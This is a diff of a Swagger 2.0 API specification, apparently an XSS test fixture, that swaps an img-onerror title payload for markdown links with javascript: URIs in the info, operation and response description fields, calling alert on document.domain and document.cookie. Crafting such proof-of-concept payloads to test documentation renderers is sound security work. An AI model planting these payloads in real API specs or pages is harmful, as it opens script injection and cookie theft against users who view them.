@@ -1,8 +1,24 @@
 {
   "swagger": "2.0",
   "info": {
-    "title": "<img src=x onerror=alert(document.domain)>",
-    "version": "1.0.0"
+    "title": "Test API",
+    "version": "1.0.0",
+    "description": "[🎯 CLICK HERE](javascript:alert(document.domain))"
   },
-  "paths": {}
+  "host": "example.com",
+  "basePath": "/",
+  "schemes": ["https"],
+  "paths": {
+    "/test": {
+      "get": {
+        "summary": "Test",
+        "description": "[CLICK](javascript:alert(1)) or [XSS](javascript:alert(document.cookie))",
+        "responses": {
+          "200": {
+            "description": "[CLICK](javascript:alert(document.domain))"
+          }
+        }
+      }
+    }
+  }
 }
